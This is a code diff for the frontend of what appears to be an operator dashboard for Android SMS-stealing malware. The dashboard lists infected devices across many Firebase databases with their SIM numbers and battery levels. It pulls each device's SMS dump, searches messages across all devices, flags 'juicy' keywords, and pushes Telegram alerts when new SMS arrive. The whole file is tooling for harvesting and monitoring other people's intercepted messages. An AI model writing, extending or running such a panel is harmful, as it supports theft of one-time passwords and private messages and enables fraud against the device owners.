+    if (s1 !== null) {
+      dev.sim1Override = s1;
+      if (s1) dev.sim1Clean = s1.replace(/\D/g,'').slice(-10) || dev.sim1Clean;
+    }
+    if (s2 !== null) {
+      dev.sim2Override = s2;
+      if (s2) dev.sim2Clean = s2.replace(/\D/g,'').slice(-10) || dev.sim2Clean;
+    }
+  }
+}
+
+function startSimEdit(evt, deviceId, slot, btn) {
+  evt.stopPropagation();
+  const wrap = btn.closest('.sim-edit-wrap');
+  if (!wrap) return;
+  const dev = currentDevices.find(d => d.deviceId === deviceId);
+  const current = (slot === 'sim1' ? dev?.sim1Clean : dev?.sim2Clean) || '';
+  wrap.innerHTML = `
+    <input class="sim-edit-input" id="sim-inp-${deviceId}-${slot}" type="tel"
+           inputmode="numeric" pattern="[0-9]*"
+           value="${current}" placeholder="10-digit number" maxlength="15"
+           oninput="this.value=this.value.replace(/[^0-9]/g,'')"
+           onkeydown="if(event.key==='Enter')saveSimEdit(event,'${deviceId}','${slot}');if(event.key==='Escape')renderDevices()">
+    <button class="sim-save-btn" onclick="saveSimEdit(event,'${deviceId}','${slot}')">✓</button>
+    <button class="sim-edit-btn" onclick="renderDevices()" title="Cancel">✕</button>
+  `;
+  document.getElementById(`sim-inp-${deviceId}-${slot}`)?.focus();
+}
+
+async function saveSimEdit(evt, deviceId, slot) {
+  evt.stopPropagation();
+  const inp = document.getElementById(`sim-inp-${deviceId}-${slot}`);
+  if (!inp) return;
+  const val = inp.value.trim();
+
+  // 1. Save to localStorage immediately (always works)
+  localStorage.setItem(_simKey(deviceId, slot), val);
+
+  // 2. Also try server (best-effort, silent fail if not available)
+  try {
+    const simApiPath = currentMode === 'old'
+      ? `/api/old/sim-overrides/${currentUrlId}/${encodeURIComponent(deviceId)}`
+      : currentMode === 'pp'
+      ? `/api/pp/sim-overrides/${currentUrlId}/${encodeURIComponent(deviceId)}`
+      : currentMode === 'srk'
+      ? `/api/srk/sim-overrides/${currentUrlId}/${encodeURIComponent(deviceId)}`
+      : `/api/sim-overrides/${currentUrlId}/${encodeURIComponent(deviceId)}?mode=new`;
+    const r = await fetch(simApiPath,
+      { method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ [slot]: val }) });
+    if (!r.ok) throw new Error('not ok');
+  } catch { /* server not available — localStorage is the fallback */ }
+
+  // 3. Update in-memory device
+  const dev = currentDevices.find(d => d.deviceId === deviceId);
+  if (dev) {
+    if (slot === 'sim1') {
+      dev.sim1Override = val;
+      dev.sim1Clean = val ? (val.replace(/\D/g,'').slice(-10) || dev.sim1Clean) : dev.sim1Clean;
+    } else {
+      dev.sim2Override = val;
+      dev.sim2Clean = val ? (val.replace(/\D/g,'').slice(-10) || dev.sim2Clean) : dev.sim2Clean;
+    }
+  }
+  renderDevices();
+}
+
+// ── Per-URL SMS Search (client-side: fetches Firebase directly) ───────────────
+let _smsSearchActive = false;
+let _smsSearchAbort  = null;
+
+function iterMsgsFE(data) {
+  const out = [];
+  function walk(obj) {
+    if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return;
+    for (const v of Object.values(obj)) {
+      if (!v || typeof v !== 'object' || Array.isArray(v)) continue;
+      if ('body' in v || 'message' in v || 'msg' in v || 'text' in v) {
+        out.push(v);
+      } else {
+        walk(v);
+      }
+    }
+  }
+  walk(data);
+  return out;
+}
+
+async function runSmsSearch() {
+  const q = document.getElementById('sms-search-input').value.trim().toLowerCase();
+  if (!q) return;
+
+  // Abort any previous search
+  if (_smsSearchAbort) _smsSearchAbort.abort();
+  _smsSearchAbort = new AbortController();
+  const abortSignal = _smsSearchAbort.signal;
+
+  const resultsDiv = document.getElementById('sms-search-results');
+  const tableWrap  = document.getElementById('device-table-wrap');
+  const clearBtn   = document.getElementById('sms-search-clear');
+  const searchBtn  = document.getElementById('sms-search-btn');
+
+  resultsDiv.style.display = 'block';
+  tableWrap.style.display  = 'none';
+  clearBtn.style.display   = '';
+  searchBtn.disabled = true;
+  searchBtn.textContent = '⏳';
+  _smsSearchActive = true;
+
+  const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const escQ = q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
+  const highlight = raw => esc(raw).replace(new RegExp(`(${escQ})`, 'gi'), '<mark>$1</mark>');
+
+  const devices = currentDevices;
+  const total   = devices.length;
+  let done = 0;
+  const hits = [];
+
+  function renderHits() {
+    return hits.slice(0,200).map(h => `
+      <div class="sms-hit-card">
+        <div class="sms-hit-meta">
+          <span class="sms-hit-device">${esc(h.deviceId.slice(0,20))}</span>
+          <span class="sms-hit-brand">${esc(h.brand)}</span>
+        </div>
+        <div class="sms-hit-body">${highlight(h.body.slice(0,400))}${h.body.length>400?'…':''}</div>
+      </div>`).join('');
+  }
+
+  function updateProgress() {
+    if (!_smsSearchActive) return;
+    resultsDiv.innerHTML = `
+      <div style="color:var(--muted);font-size:13px;margin-bottom:8px">
+        🔍 Scanning ${done}/${total} devices… <b style="color:var(--yellow)">${hits.length}</b> match(es) found
+      </div>
+      ${hits.length ? renderHits() : ''}`;
+  }
+
+  updateProgress();
+
+  for (const d of devices) {
+    if (abortSignal.aborted || hits.length >= 200) break;
+
+    // Use smsLink as-is (already ends with .json?print=pretty)
+    const url = d.smsLink;
+
+    try {
+      const resp = await fetch(url, { signal: abortSignal });
+      if (!resp.ok) { done++; continue; }
+      const text = await resp.text();
+      if (!text || text.trim() === 'null' || text.trim()[0] === '<') { done++; continue; }
+      let smsData;
+      try { smsData = JSON.parse(text); } catch { done++; continue; }
+      if (!smsData) { done++; continue; }
+
+      for (const msg of iterMsgsFE(smsData)) {
+        const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+        if (body && body.toLowerCase().includes(q)) {
+          hits.push({ deviceId: d.deviceId, brand: d.brand, body });
+          if (hits.length >= 200) break;
+        }
+      }
+    } catch (e) {
+      if (abortSignal.aborted) break;
+      // network/timeout error — skip silently
+    }
+
+    done++;
+    if (done % 5 === 0 || done === total) updateProgress();
+  }
+
+  // Final render
+  if (!_smsSearchActive) return;
+  if (!hits.length) {
+    resultsDiv.innerHTML = `<p style="color:var(--muted);padding:10px">📭 No SMS found containing "<b style="color:var(--text)">${esc(q)}</b>" across ${total} devices.</p>`;
+  } else {
+    resultsDiv.innerHTML = `
+      <div style="color:var(--muted);font-size:13px;margin-bottom:10px">
+        Found <b style="color:var(--text)">${hits.length}</b> message(s) matching
+        "<b style="color:var(--yellow)">${esc(q)}</b>" across ${total} devices
+        ${hits.length >= 200 ? ' <span style="color:var(--yellow)">(capped at 200)</span>' : ''}
+      </div>
+      ${renderHits()}`;
+  }
+
+  searchBtn.disabled = false;
+  searchBtn.textContent = 'Search';
+}
+
+function clearSmsSearch() {
+  _smsSearchActive = false;
+  if (_smsSearchAbort) { _smsSearchAbort.abort(); _smsSearchAbort = null; }
+  document.getElementById('sms-search-input').value = '';
+  document.getElementById('sms-search-results').style.display = 'none';
+  document.getElementById('sms-search-results').innerHTML = '';
+  document.getElementById('device-table-wrap').style.display = '';
+  document.getElementById('sms-search-clear').style.display = 'none';
+  document.getElementById('sms-search-btn').disabled = false;
+  document.getElementById('sms-search-btn').textContent = 'Search';
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+// Start on homepage — user picks New or Old
+document.getElementById('view-urls').classList.remove('active');
+document.getElementById('view-home').classList.add('active');
+
+// ── Telegram Alert System ─────────────────────────────────────────────────────
+
+// Inject "🤖 Telegram Bots" button into header (no modification to existing HTML)
+(function injectTelegramBtn() {
+  const header = document.querySelector('header');
+  if (!header) return;
+  const btn = document.createElement('button');
+  btn.className = 'btn btn-ghost';
+  btn.style.marginLeft = '8px';
+  btn.textContent = '🤖 Telegram Bots';
+  btn.onclick = openTelegramSetup;
+  header.appendChild(btn);
+})();
+
+// ── State ─────────────────────────────────────────────────────────────────────
+let currentAlertConfigs = {};
+let _alertModalDeviceId = null;
+let _alertModalBrand    = null;
+let _alertHasExisting   = false;
+
+// ── Utility helpers ───────────────────────────────────────────────────────────
+function _esc(str) {
+  return String(str)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+function _showFieldError(id, msg) {
+  const el = document.getElementById(id);
+  if (el) { el.textContent = msg; el.classList.add('visible'); }
+}
+function _hideFieldError(id) {
+  const el = document.getElementById(id);
+  if (el) el.classList.remove('visible');
+}
+
+// ── Setup Modal ───────────────────────────────────────────────────────────────
+function openTelegramSetup() {
+  loadBotsForModal();
+  document.getElementById('telegram-setup-modal').classList.add('open');
+}
+function closeTelegramSetup() {
+  document.getElementById('telegram-setup-modal').classList.remove('open');
+  document.getElementById('new-bot-name').value  = '';
+  document.getElementById('new-bot-token').value = '';
+  document.getElementById('bot-form-status').textContent = '';
+  _hideFieldError('bot-name-error');
+  _hideFieldError('bot-token-error');
+}
+async function loadBotsForModal() {
+  const list = document.getElementById('bot-list');
+  list.textContent = 'Loading…';
+  try {
+    const res  = await fetch('/api/telegram/bots');
+    const bots = await res.json();
+    if (!bots.length) {
+      list.innerHTML = '<p style="color:var(--muted);font-size:0.85rem">No bots saved yet.</p>';
+      return;
+    }
+    list.innerHTML = bots.map(b => `
+      <div class="bot-list-item">
+        <span title="${_esc(b.name)}">${_esc(b.name)}</span>
+        <div style="display:flex;gap:4px">
+          <button class="btn btn-ghost" style="font-size:0.75rem;padding:2px 7px"
+                  onclick="syncBotSubs('${_esc(b.id)}', this)">🔄 Sync</button>
+          <button class="btn btn-ghost" style="font-size:0.8rem;padding:3px 8px"
+                  onclick="deleteBot('${_esc(b.id)}','${_esc(b.name)}')">Delete</button>
+        </div>
+      </div>`).join('');
+  } catch (e) {
+    list.innerHTML = '<p style="color:var(--red);font-size:0.85rem">Failed to load bots.</p>';
+  }
+}
+async function addBot() {
+  const nameEl  = document.getElementById('new-bot-name');
+  const tokenEl = document.getElementById('new-bot-token');
+  const status  = document.getElementById('bot-form-status');
+  let valid = true;
+  _hideFieldError('bot-name-error');
+  _hideFieldError('bot-token-error');
+  status.textContent = '';
+  if (!nameEl.value.trim())  { _showFieldError('bot-name-error',  'Bot name is required.');  valid = false; }
+  if (!tokenEl.value.trim()) { _showFieldError('bot-token-error', 'Bot token is required.'); valid = false; }
+  if (!valid) return;
+  try {
+    const res  = await fetch('/api/telegram/bots', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ name: nameEl.value.trim(), token: tokenEl.value.trim() }),
+    });
+    const data = await res.json();
+    if (res.status === 201) { nameEl.value = ''; tokenEl.value = ''; loadBotsForModal(); }
+    else status.textContent = data.error || 'Failed to add bot.';
+  } catch (e) { status.textContent = 'Network error. Could not add bot.'; }
+}
+async function deleteBot(id, name) {
+  if (!confirm(`Delete bot '${name}'? All alert configs using this bot will also be removed.`)) return;
+  try {
+    const res = await fetch(`/api/telegram/bots/${id}`, { method: 'DELETE' });
+    if (res.status === 204) loadBotsForModal();
+    else { const d = await res.json().catch(() => ({})); alert(d.error || 'Failed to delete bot.'); }
+  } catch (e) { alert('Network error. Could not delete bot.'); }
+}
+
+async function syncBotSubs(id, btn) {
+  const orig = btn.textContent;
+  btn.disabled = true; btn.textContent = '…';
+  try {
+    const res  = await fetch(`/api/telegram/bots/${id}/sync`, { method: 'POST' });
+    const data = await res.json();
+    if (res.ok) btn.textContent = `✓ ${data.subscribers}`;
+    else        btn.textContent = '✗';
+  } catch (e)  { btn.textContent = '✗'; }
+  setTimeout(() => { btn.textContent = orig; btn.disabled = false; }, 2000);
+}
+
+async function broadcastToSubscribers() {
+  const botId   = document.getElementById('broadcast-bot-select').value;
+  const message = document.getElementById('broadcast-message').value.trim();
+  const status  = document.getElementById('broadcast-status');
+  if (!botId)   { status.style.color = 'var(--red)'; status.textContent = 'Select a bot first.'; return; }
+  if (!message) { status.style.color = 'var(--red)'; status.textContent = 'Enter a message.'; return; }
+
+  status.style.color = 'var(--muted)';
+  status.textContent = 'Fetching subscribers…';
+  try {
+    // Step 1: get subscribers
+    const subRes  = await fetch(`/api/telegram/bots/${botId}/subscribers`);
+    const subData = await subRes.json();
+    if (!subRes.ok) { status.style.color='var(--red)'; status.textContent = subData.error || 'Failed to fetch subscribers.'; return; }
+    if (!subData.total) { status.style.color='var(--muted)'; status.textContent = 'No subscribers found (no one has messaged this bot yet).'; return; }
+
+    status.textContent = `Sending to ${subData.total} subscriber(s)…`;
+
+    // Step 2: broadcast
+    const bcRes  = await fetch(`/api/telegram/bots/${botId}/broadcast`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chatIds: subData.chatIds, message }),
+    });
+    const bcData = await bcRes.json();
+    if (bcRes.ok) {
+      status.style.color = 'var(--green)';
+      status.textContent = `✓ Sent to ${bcData.sent} chat(s)${bcData.failed ? `, ${bcData.failed} failed` : ''}.`;
+      document.getElementById('broadcast-message').value = '';
+    } else {
+      status.style.color = 'var(--red)';
+      status.textContent = bcData.error || 'Broadcast failed.';
+    }
+  } catch (e) {
+    status.style.color = 'var(--red)';
+    status.textContent = 'Network error. Could not broadcast.';
+  }
+}
+
+// Populate broadcast bot dropdown when Setup modal opens
+const _origLoadBots = loadBotsForModal;
+loadBotsForModal = async function() {
+  await _origLoadBots();
+  // also refresh broadcast dropdown
+  const sel = document.getElementById('broadcast-bot-select');
+  if (!sel) return;
+  sel.innerHTML = '<option value="" disabled selected>— Select a bot —</option>';
+  try {
+    const res  = await fetch('/api/telegram/bots');
+    const bots = await res.json();
+    bots.forEach(b => {
+      const opt = document.createElement('option');
+      opt.value = b.id; opt.textContent = b.name;
+      sel.appendChild(opt);
+    });
+  } catch {}
+};
+
+// ── Alert Modal ───────────────────────────────────────────────────────────────
+async function openAlertModal(deviceId, brand) {
+  _alertModalDeviceId = deviceId;
+  _alertModalBrand    = brand;
+  _alertHasExisting   = false;
+  document.getElementById('alert-modal-status').textContent = '';
+  document.getElementById('alert-modal-device-heading').textContent = `Device: ${deviceId}  |  ${brand}`;
+  document.getElementById('trigger-online').checked  = false;
+  document.getElementById('trigger-offline').checked = false;
+  document.getElementById('trigger-sms').checked     = false;
+  document.getElementById('alert-subscriber-info').textContent = '';
+  _hideFieldError('alert-bot-error');
+  _hideFieldError('alert-trigger-error');
+
+  const select = document.getElementById('alert-bot-select');
+  select.innerHTML = '<option value="" disabled selected>— Select a bot —</option>';
+  try {
+    const res  = await fetch('/api/telegram/bots');
+    const bots = await res.json();
+    bots.forEach(b => {
+      const opt = document.createElement('option');
+      opt.value = b.id; opt.textContent = b.name;
+      select.appendChild(opt);
+    });
+  } catch (e) { /* leave empty */ }
+
+  const cfg = currentAlertConfigs[deviceId];
+  if (cfg) {
+    _alertHasExisting = true;
+    select.value = cfg.bot_id;
+    document.getElementById('trigger-online').checked  = cfg.triggers.includes('device_online');
+    document.getElementById('trigger-offline').checked = cfg.triggers.includes('device_offline');
+    document.getElementById('trigger-sms').checked     = cfg.triggers.includes('new_sms');
+    // Show subscriber count for pre-selected bot
+    _loadSubscriberInfo(cfg.bot_id);
+  }
+  document.getElementById('remove-alert-btn').disabled = !_alertHasExisting;
+  document.getElementById('telegram-alert-modal').classList.add('open');
+}
+
+// Show subscriber count when bot is changed in dropdown
+document.addEventListener('change', function(e) {
+  if (e.target && e.target.id === 'alert-bot-select') {
+    _loadSubscriberInfo(e.target.value);
+  }
+});
+
+async function _loadSubscriberInfo(botId) {
+  const infoEl = document.getElementById('alert-subscriber-info');
+  if (!infoEl || !botId) return;
+  infoEl.textContent = 'Fetching subscribers…';
+  try {
+    const res  = await fetch(`/api/telegram/bots/${botId}/subscribers`);
+    const data = await res.json();
+    if (res.ok) {
+      infoEl.style.color = data.total > 0 ? 'var(--green)' : 'var(--yellow)';
+      infoEl.textContent = data.total > 0
+        ? `✓ ${data.total} subscriber(s) — alerts will go to all of them`
+        : '⚠ No subscribers yet. Have users send /start to this bot first.';
+    } else {
+      infoEl.style.color = 'var(--red)';
+      infoEl.textContent = data.error || 'Could not fetch subscribers.';
+    }
+  } catch (e) {
+    infoEl.style.color = 'var(--muted)';
+    infoEl.textContent = 'Could not fetch subscriber count.';
+  }
+}
+function closeAlertModal() {
+  document.getElementById('telegram-alert-modal').classList.remove('open');
+  _alertModalDeviceId = null; _alertModalBrand = null;
+}
+async function saveAlert() {
+  const botId   = document.getElementById('alert-bot-select').value;
+  const triggers = ['trigger-online','trigger-offline','trigger-sms']
+    .filter(id => document.getElementById(id).checked)
+    .map(id => document.getElementById(id).value);
+  const status = document.getElementById('alert-modal-status');
+  let valid = true;
+  _hideFieldError('alert-bot-error'); _hideFieldError('alert-trigger-error');
+  status.textContent = '';
+  if (!botId)           { _showFieldError('alert-bot-error',     'Please select a bot.');         valid = false; }
+  if (!triggers.length) { _showFieldError('alert-trigger-error', 'Select at least one trigger.'); valid = false; }
+  if (!valid) return;
+  try {
+    const res  = await fetch(`/api/telegram/alerts/${currentMode}/${_alertModalDeviceId}`, {
+      method: 'PUT', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ bot_id: botId, triggers }),
+    });
+    const data = await res.json();
+    if (res.ok) {
+      currentAlertConfigs[_alertModalDeviceId] = data;
+      _updateBellIcon(_alertModalDeviceId, true);
+      closeAlertModal();
+    } else { status.textContent = data.error || 'Failed to save alert.'; }
+  } catch (e) { status.textContent = 'Network error. Could not save alert.'; }
+}
+async function removeAlert() {
+  const status = document.getElementById('alert-modal-status');
+  status.textContent = '';
+  try {
+    const res = await fetch(`/api/telegram/alerts/${currentMode}/${_alertModalDeviceId}`, { method: 'DELETE' });
+    if (res.status === 204) {
+      delete currentAlertConfigs[_alertModalDeviceId];
+      _updateBellIcon(_alertModalDeviceId, false);
+      closeAlertModal();
+    } else {
+      const d = await res.json().catch(() => ({}));
+      status.textContent = d.error || 'Failed to remove alert.';
+    }
+  } catch (e) { status.textContent = 'Network error. Could not remove alert.'; }
+}
+
+// ── Bell icon helpers ─────────────────────────────────────────────────────────
+function _updateBellIcon(deviceId, active) {
+  const btn = document.querySelector(`.bell-btn[data-device-id="${deviceId}"]`);
+  if (!btn) return;
+  btn.classList.toggle('active', active);
+  btn.title = active ? 'Alert configured' : 'No alert configured';
+}
+async function loadAlertConfigsForUrlSet() {
+  currentAlertConfigs = {};
+  try {
+    const res = await fetch(`/api/telegram/alerts/${currentMode}`);
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    currentAlertConfigs = await res.json();
+    _refreshAllBells();
+  } catch (e) {
+    console.warn('[AlertConfigs] Failed to load:', e.message);
+    _showAlertLoadError();
+  }
+}
+function _refreshAllBells() {
+  document.querySelectorAll('.bell-btn[data-device-id]').forEach(btn => {
+    const active = !!currentAlertConfigs[btn.dataset.deviceId];
+    btn.classList.toggle('active', active);
+    btn.title = active ? 'Alert configured' : 'No alert configured';
+  });
+}
+function _showAlertLoadError() {
+  if (document.getElementById('alert-load-warning')) return;
+  const el = document.createElement('div');
+  el.id = 'alert-load-warning';
+  el.style.cssText = 'color:#f59e0b;font-size:0.8rem;margin:4px 0;padding:4px 8px;background:var(--bg2);border-radius:4px;display:inline-block';
+  el.textContent = '⚠ Alert configuration data could not be loaded. Bell icons may be inaccurate.';
+  const wrap = document.getElementById('device-table-wrap');
+  if (wrap) wrap.prepend(el);
+  setTimeout(() => el.remove(), 8000);
+}
+
+// ── FindAll view ─────────────────────────────────────────────────────────────
+let _findallCurrentPage = 1;
+let _findallCurrentQ    = '';
+
+function openFindAllView() {
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'none';
+  document.getElementById('view-findall').style.display = 'block';
+  document.getElementById('mode-toggle').style.display = 'none';
+  document.getElementById('total-badge').textContent = '—';
+  // Focus the input
+  setTimeout(() => document.getElementById('findall-input')?.focus(), 100);
+}
+
+function resetFindAll() {
+  document.getElementById('findall-results').innerHTML = '';
+  document.getElementById('findall-pagination').innerHTML = '';
+  document.getElementById('findall-status').textContent = '';
+  document.getElementById('total-badge').textContent = '—';
+  document.getElementById('findall-dl-btn').style.display = 'none';
+  _findallAllResults = null;
+}
+
+// ── FindAll: download all results as JSON ─────────────────────────────────────
+let _findallAllResults = null; // stores { query, savedAt, total, results[] }
+
+function downloadFindAllResults() {
+  if (!_findallAllResults) return;
+  const blob = new Blob([JSON.stringify(_findallAllResults, null, 2)], { type: 'application/json' });
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement('a');
+  const safe = _findallAllResults.query.replace(/[^a-z0-9_-]/gi, '_').slice(0, 40);
+  a.href     = url;
+  a.download = `findall_${safe}_${new Date().toISOString().slice(0,10)}.json`;
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+// ── FindAll: upload & re-render a previously saved JSON ──────────────────────
+function uploadFindAllResults(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+  // Reset the file input so the same file can be re-uploaded
+  event.target.value = '';
+
+  const reader = new FileReader();
+  reader.onload = e => {
+    try {
+      const data = JSON.parse(e.target.result);
+      if (!data.results || !Array.isArray(data.results))
+        throw new Error('Invalid file: missing results array');
+
+      _findallAllResults = data;
+      const q = data.query || '(uploaded)';
+      document.getElementById('findall-input').value = q;
+      document.getElementById('findall-dl-btn').style.display = '';
+      document.getElementById('total-badge').textContent = `${data.total} found`;
+      document.getElementById('findall-status').textContent =
+        `📂 Loaded from file — ${data.total} result(s) for "${q}" (saved ${data.savedAt ? new Date(data.savedAt).toLocaleString() : 'unknown'})`;
+      document.getElementById('findall-pagination').innerHTML = '';
+
+      _renderFindAllResults(data.results, q);
+    } catch (err) {
+      document.getElementById('findall-status').textContent = `❌ Upload failed: ${err.message}`;
+    }
+  };
+  reader.readAsText(file);
+}
+
+async function runFindAll(page) {
+  const q = document.getElementById('findall-input').value.trim();
+  if (!q) return;
+  _findallCurrentQ    = q;
+  _findallCurrentPage = page;
+
+  const btn     = document.getElementById('findall-btn');
+  const status  = document.getElementById('findall-status');
+  const results = document.getElementById('findall-results');
+  const pagDiv  = document.getElementById('findall-pagination');
+
+  btn.disabled = true; btn.textContent = '⏳';
+  status.textContent = `Searching SMS across all URLs for "${q}"… (this may take a moment)`;
+  results.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+  pagDiv.innerHTML = '';
+
+  try {
+    const res  = await fetch(`/api/findall?q=${encodeURIComponent(q)}&page=${page}&limit=50`);
+    const data = await res.json();
+
+    btn.disabled = false; btn.textContent = 'Search';
+
+    if (data.error) { status.textContent = `Error: ${data.error}`; results.innerHTML = ''; return; }
+
+    document.getElementById('total-badge').textContent = `${data.total} found`;
+    status.textContent = data.total > 0
+      ? `Found ${data.total} device(s) across ${data.candidates} candidates — page ${data.page} of ${data.totalPages}`
+      : `No devices found with SMS containing "${q}"`;
+
+    if (!data.results.length) { results.innerHTML = ''; return; }
+
+    // Store all results for download (accumulate across pages)
+    if (page === 1) {
+      _findallAllResults = { query: q, savedAt: new Date().toISOString(), total: data.total, results: [...data.results] };
+    } else if (_findallAllResults) {
+      _findallAllResults.results.push(...data.results);
+    }
+    document.getElementById('findall-dl-btn').style.display = '';
+
+    _renderFindAllResults(data.results, q);
+
+    // Pagination
+    if (data.totalPages > 1) {
+      let pag = '';
+      if (page > 1) pag += `<button class="btn btn-ghost" style="padding:4px 10px;font-size:12px" onclick="runFindAll(${page-1})">← Prev</button>`;
+      pag += `<span style="color:var(--muted);font-size:12px;padding:0 8px">Page ${page} / ${data.totalPages}</span>`;
+      if (page < data.totalPages) pag += `<button class="btn btn-ghost" style="padding:4px 10px;font-size:12px" onclick="runFindAll(${page+1})">Next →</button>`;
+      pagDiv.innerHTML = pag;
+    }
+  } catch (e) {
+    btn.disabled = false; btn.textContent = 'Search';
+    status.textContent = `Error: ${e.message}`;
+    results.innerHTML = '';
+  }
+}
+
+// ── Shared renderer for findall results (used by both runFindAll and upload) ──
+function _renderFindAllResults(items, q) {
+  const results = document.getElementById('findall-results');
+  const esc      = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const setLabel = s => s === 'pp' ? '🔵 PP' : s === 'old' ? '📦 Old' : s === 'srk' ? '👑 SRK' : '🆕 New';
+  const isToday  = ts => { if (!ts) return false; try { return (Date.now()-new Date(ts).getTime()) < 86400000; } catch { return false; } };
+
+  results.innerHTML = items.map(d => `
+      <div class="url-card" style="cursor:default;margin-bottom:8px">
+        <div class="url-card-header">
+          <span class="url-id" style="font-size:13px">#${d.urlId}</span>
+          <span class="url-host" style="font-size:11px">${d.url.replace('https://','').replace('-default-rtdb.firebaseio.com','')}</span>
+          <span class="badge-sm badge-blue" style="font-size:10px;margin-left:4px">${setLabel(d.urlSet)}</span>
+          <span class="badge-sm ${d.status==='online'?'badge-green':'badge-red'}" style="font-size:10px;margin-left:auto">${d.status}</span>
+        </div>
+        <div style="font-size:12px;margin:4px 0;display:flex;align-items:center;gap:6px">
+          ${isToday(d.lastActivity) ? '<span title="Active today">🔥</span>' : ''}
+          <code style="color:var(--text);font-size:11px" onclick="navigator.clipboard&&navigator.clipboard.writeText('${d.deviceId}')" title="Click to copy" style="cursor:pointer">${esc(d.deviceId)}</code>
+        </div>
+        <div class="url-metrics" style="margin-bottom:8px">
+          <div class="metric"><div class="k">Brand</div><div class="v" style="font-size:12px">${esc(d.brand)}</div></div>
+          <div class="metric"><div class="k">Battery</div><div class="v" style="font-size:12px">${esc(d.battery)}</div></div>
+          <div class="metric"><div class="k">SIM1</div><div class="v" style="font-size:12px">${esc(d.sim1)}</div></div>
+          <div class="metric"><div class="k">Last Activity</div><div class="v" style="font-size:11px">${d.lastActivity||'—'}</div></div>
+        </div>
+        ${d.matchBody ? `<div style="font-size:11px;color:var(--muted);background:var(--bg3);border-radius:6px;padding:6px 10px;margin-bottom:8px;word-break:break-word">
+          …${esc(d.matchBody).replace(new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi'),'<mark style="background:rgba(245,158,11,.35);color:var(--yellow);padding:0 2px;border-radius:2px">$1</mark>')}…
+        </div>` : ''}
+        ${d.juicyKeywords.length ? `<div>${d.juicyKeywords.map(k=>`<span class="kw-tag">${esc(k)}</span>`).join('')}</div>` : ''}
+        <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+          <a class="sms-btn" href="${esc(d.smsLink)}" target="_blank">📥 SMS</a>
+          <button class="sms-btn" onclick="switchMode('${d.urlSet}');openUrl(${d.urlId})">👁️ View URL</button>
+        </div>
+      </div>`).join('');
+}
+
+// ── On Alert Devices view ─────────────────────────────────────────────────────
+async function openAlertDevicesView() {
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'block';
+  document.getElementById('mode-toggle').style.display = 'none';
+  document.getElementById('total-badge').textContent = '—';
+
+  const body = document.getElementById('alert-devices-body');
+  body.innerHTML = '<div class="loading"><div class="spinner"></div><br>Loading…</div>';
+
+  try {
+    const res  = await fetch('/api/alert-devices');
+    const data = await res.json();
+    document.getElementById('total-badge').textContent = `${data.total} alert(s)`;
+
+    if (!data.total) {
+      body.innerHTML = '<p style="color:var(--muted);padding:20px 0">No devices are under alert mode yet. Click 🔔 on any device to set up alerts.</p>';
+      return;
+    }
+
+    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    const setLabel = s => s === 'pp' ? '🔵 PP' : s === 'old' ? '📦 Old' : s === 'srk' ? '👑 SRK' : '🆕 New';
+    const triggerLabel = t => t === 'device_online' ? '🟢 Online' : t === 'device_offline' ? '🔴 Offline' : '📩 SMS';
+
+    body.innerHTML = `
+      <div class="url-grid">
+        ${data.results.map(d => `
+          <div class="url-card" style="cursor:default">
+            <div class="url-card-header">
+              <span class="url-id" style="font-size:13px">🔔</span>
+              <span class="url-host"><code style="color:var(--text);font-size:11px">${esc(d.deviceId)}</code></span>
+              <span class="badge-sm ${d.status==='online'?'badge-green':d.status==='offline'?'badge-red':''}" style="margin-left:auto;font-size:10px">${esc(d.status)}</span>
+            </div>
+            <div class="url-metrics" style="margin-bottom:8px">
+              <div class="metric"><div class="k">Brand</div><div class="v" style="font-size:12px">${esc(d.brand)}</div></div>
+              <div class="metric"><div class="k">URL Set</div><div class="v" style="font-size:12px">${setLabel(d.urlSet)}</div></div>
+              <div class="metric"><div class="k">Bot</div><div class="v" style="font-size:12px">${esc(d.botName)}</div></div>
+              <div class="metric"><div class="k">Last Activity</div><div class="v" style="font-size:11px">${d.lastActivity||'—'}</div></div>
+            </div>
+            <div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+              ${d.triggers.map(t => `<span class="badge-sm badge-blue" style="font-size:10px">${triggerLabel(t)}</span>`).join('')}
+            </div>
+            <div style="font-size:11px;color:var(--muted)">SIM1: ${esc(d.sim1)}</div>
+          </div>`).join('')}
+      </div>`;
+  } catch (e) {
+    body.innerHTML = `<p style="color:var(--red)">Error loading alert devices: ${e.message}</p>`;
+  }
+}
+
+async function _refreshAlertDevicesCount() {
+  try {
+    const res  = await fetch('/api/alert-devices');
+    const data = await res.json();
+    const sub  = document.getElementById('alert-devices-home-sub');
+    if (sub) sub.textContent = data.total > 0
+      ? `${data.total} device(s) monitored`
+      : 'No alerts configured yet';
+  } catch { /* silent */ }
+}
+
+// Refresh alert count when home page loads
+_refreshAlertDevicesCount();
+
+// ── Notification System ───────────────────────────────────────────────────────
+let _notifLastSeen  = null; // ISO timestamp of most recent entry when we last checked
